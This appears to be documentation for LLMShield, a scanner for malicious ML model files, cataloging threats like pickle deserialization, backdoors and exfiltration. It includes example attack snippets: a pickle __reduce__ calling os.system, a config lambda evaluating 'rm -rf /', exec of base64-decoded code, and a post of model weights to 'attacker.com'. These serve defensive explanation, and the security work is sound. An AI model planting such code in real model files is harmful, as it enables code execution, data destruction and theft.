# ML Model Vulnerabilities Catalog

## Overview

This document catalogs known vulnerabilities in machine learning models and frameworks, along with the LLMShield scanners that detect them.

## Vulnerability Categories

### 1. Deserialization Vulnerabilities

#### Pickle/Unpickle Attacks
- **Risk**: Arbitrary code execution through malicious pickle files
- **Scanner**: `PickleScanner`
- **Dangerous Opcodes**:
  - `GLOBAL`: Can import any module (CRITICAL)
  - `REDUCE`: Can call any callable (CRITICAL)
  - `BUILD`: Can call object methods (HIGH)
  - `INST`, `OBJ`, `NEWOBJ`: Object instantiation (HIGH)

**Example Attack**:
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('malicious_command',))

pickle.dumps(Exploit())
```

### 2. Model Poisoning

#### Backdoor Triggers
- **Risk**: Models that behave maliciously on specific inputs
- **Scanners**: `PatternScanner`, `AnomalyScanner`
- **Indicators**:
  - Unusual layer configurations
  - Hidden preprocessing steps
  - Base64 encoded data in model
  - Excessive model complexity

#### Weight Manipulation
- **Risk**: Altered model weights to produce incorrect outputs
- **Scanner**: `AnomalyScanner`
- **Detection**: Statistical analysis of weight distributions

### 3. Code Injection

#### Embedded Code Execution
- **Risk**: Models containing executable code
- **Scanner**: `CodeScanner`
- **Patterns**:
  - `eval()`, `exec()` calls
  - `__import__()` usage
  - Lambda functions with system calls
  - Compiled code objects

**Example**:
```python
# Malicious code in model config
{
    "preprocessor": "lambda x: eval('__import__(\"os\").system(\"rm -rf /\")')"
}
```

### 4. Data Exfiltration

#### Network Communication
- **Risk**: Models that send data to external servers
- **Scanner**: `ExfiltrationScanner`
- **Patterns**:
  - HTTP/HTTPS requests
  - Socket connections
  - DNS queries
  - File uploads

#### Information Leakage
- **Risk**: Models containing sensitive training data
- **Scanner**: `SecretScanner`
- **Examples**:
  - Embedded API keys
  - Database credentials
  - Personal information
  - Proprietary algorithms

### 5. Framework-Specific Vulnerabilities

#### PyTorch Vulnerabilities
- **Scanner**: `PyTorchAttributeScanner`
- **Risks**:
  - Dangerous attributes (`__code__`, `__globals__`)
  - Malicious custom layers
  - Unsafe tensor operations
  - State dict manipulation

#### TensorFlow CVEs
- **Scanner**: `PatternScanner`
- **Known Issues**:
  - CVE-2022-23566: Integer overflow in tf.raw_ops.QuantizeAndDequantizeV4Grad
  - CVE-2022-23567: Segfault in simplifyBroadcast
  - CVE-2022-23568: Heap OOB in nested tf.map_fn

### 6. Supply Chain Attacks

#### Malicious Dependencies
- **Risk**: Models requiring compromised packages
- **Scanners**: `PatternScanner`, `CodeScanner`
- **Indicators**:
  - Unusual import statements
  - References to unknown packages
  - Version-specific requirements

#### Model Substitution
- **Risk**: Legitimate models replaced with malicious versions
- **Scanner**: `SignatureScanner`
- **Detection**: Hash verification, signature checking

## Vulnerability Patterns

### High-Risk Patterns
1. **Dynamic Code Loading**
   ```python
   exec(base64.b64decode(model_config['code']))
   ```

2. **Unsafe Deserialization**
   ```python
   data = pickle.loads(untrusted_input)
   ```

3. **Network Operations**
   ```python
   requests.post("http://attacker.com", data=model_weights)
   ```

4. **File System Access**
   ```python
   os.system(f"cat {sensitive_file}")
   ```

## Detection Implementation

### Scanner Mapping

| Vulnerability Type | Primary Scanner | Secondary Scanners |
|-------------------|----------------|-------------------|
| Pickle Exploits | PickleScanner | CodeScanner |
| Embedded Secrets | SecretScanner | PyTorchAttributeScanner |
| Code Injection | CodeScanner | PatternScanner |
| Data Exfiltration | ExfiltrationScanner | SignatureScanner |
| Model Backdoors | AnomalyScanner | EntropyScanner |
| Known Malware | SignatureScanner | PatternScanner |
| Obfuscation | EntropyScanner | CodeScanner |

### Risk Scoring

Each vulnerability is assigned a risk score based on:
- **Severity** (CRITICAL: 9-10, HIGH: 7-8, MEDIUM: 4-6, LOW: 1-3)
- **Confidence** (0.0-1.0)
- **Impact** (Code execution > Data theft > DoS > Information disclosure)

### Real-World Examples

1. **Malicious Pickle in PyTorch Model**
   - File: `bert_model.pth`
   - Vulnerability: GLOBAL opcode importing os.system
   - Impact: Remote code execution on model load

2. **Embedded AWS Credentials**
   - File: `model_config.json`
   - Vulnerability: Hardcoded AWS access key
   - Impact: Unauthorized cloud resource access

3. **Backdoored Image Classifier**
   - File: `resnet50_modified.pb`
   - Vulnerability: Hidden trigger in preprocessing
   - Impact: Misclassification on specific inputs

## Mitigation Strategies

1. **Use Safe Formats**: Prefer SafeTensors over Pickle
2. **Scan Before Load**: Always scan models from untrusted sources
3. **Sandboxing**: Load models in isolated environments
4. **Signature Verification**: Verify model signatures
5. **Regular Scanning**: Scan models in CI/CD pipelines
6. **Dependency Auditing**: Check all model dependencies
7. **Access Control**: Limit model file permissions

## References

- [OWASP ML Security Top 10](https://owasp.org/www-project-machine-learning-security/)
- [Adversarial ML Threat Matrix](https://github.com/mitre/advmlthreatmatrix)
- [PyTorch Security](https://pytorch.org/docs/stable/security.html)
- [TensorFlow Security](https://github.com/tensorflow/tensorflow/security)
- [Pickle Security Warning](https://docs.python.org/3/library/pickle.html#security)